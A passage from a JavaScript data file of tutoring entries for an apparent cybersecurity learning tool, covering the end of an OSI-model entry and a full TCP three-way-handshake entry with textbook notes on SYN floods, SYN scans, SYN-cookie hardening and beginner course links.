      '**Layered Defense-in-Depth:** Deploy complementary security controls at every layer so that a bypass at Layer 7 (e.g. an application bug) is contained by Layer 4 and Layer 3 firewall segmentation.'
    ],
    followUpQuestion: 'Would you like to see how packet analysis tools like Wireshark inspect these layers, or explore how specific attacks (like ARP spoofing at Layer 2 vs SQL injection at Layer 7) work in practice?',
    authorityResource: {
      id: 'auth-osi',
      title: 'Professor Messer CompTIA Network+ (OSI Model & TCP/IP)',
      canonicalUrl: 'https://www.professormesser.com/network-plus/n10-008/n10-008-training-course/',
      provider: { name: 'Professor Messer' },
      resourceType: 'course',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Complete free video course covering computer networking foundations, the 7-layer OSI model, packet encapsulation, and TCP/IP protocol analysis.'
    }
  },

  // 29. TCP Handshake
  {
    id: 'tcp_handshake',
    title: 'TCP/IP 3-Way Handshake & Transport Layer Security',
    keywords: ['tcp', 'tcp/ip', 'handshake', '3-way handshake', 'syn ack'],
    regex: /\b(tcp|tcp\/ip|handshake|3-way handshake|syn ack)\b/i,
    role: 'Reliable Connection Establishment & Transport Security',
    overview: 'The TCP/IP Model is the 4-layer protocol suite (Network Access, Internet, Transport, Application) that powers the modern Internet. At the Transport layer, TCP guarantees reliable, ordered packet delivery through the Three-Way Handshake.',
    pillars: [
      '**1. SYN (Synchronize):** The client sends a TCP packet with the SYN flag set and an Initial Sequence Number (ISN) requesting a connection.',
      '**2. SYN-ACK (Synchronize-Acknowledge):** The server responds with both SYN and ACK flags set, acknowledging the client\'s sequence number and presenting its own sequence number.',
      '**3. ACK (Acknowledge):** The client sends an ACK packet confirming the server\'s reply, and the reliable full-duplex session is established.'
    ],
    operationalUse: [
      '**SYN Flood DDoS:** An attacker fires thousands of spoofed SYN packets without sending the final ACK, filling up the target\'s connection memory table until legitimate users are locked out.',
      '**Stealth Port Scans (Nmap `-sS`):** The scanner sends SYN; if it gets SYN-ACK, it knows the port is open and immediately sends RST (Reset) instead of ACK to avoid establishing a full connection logged by applications.'
    ],
    defenseAndHardening: [
      '**SYN Cookies:** Enable SYN cookies in the operating system kernel (`sysctl -w net.ipv4.tcp_syncookies=1`) to resist SYN flood attacks without dropping legitimate connections.'
    ],
    followUpQuestion: 'Would you like to see how to capture a TCP 3-way handshake in Wireshark, or explore how UDP differs for DNS and streaming?',
    authorityResource: {
      id: 'auth-tcp',
      title: 'Cloudflare Learning Center: What is a TCP 3-Way Handshake?',
      canonicalUrl: 'https://www.cloudflare.com/learning/ddos/glossary/tcp-3-way-handshake/',
      provider: { name: 'Cloudflare' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Visual and architectural explanation of TCP connection establishment, sequence tracking, and SYN flood mitigation.'
    }
  }
];
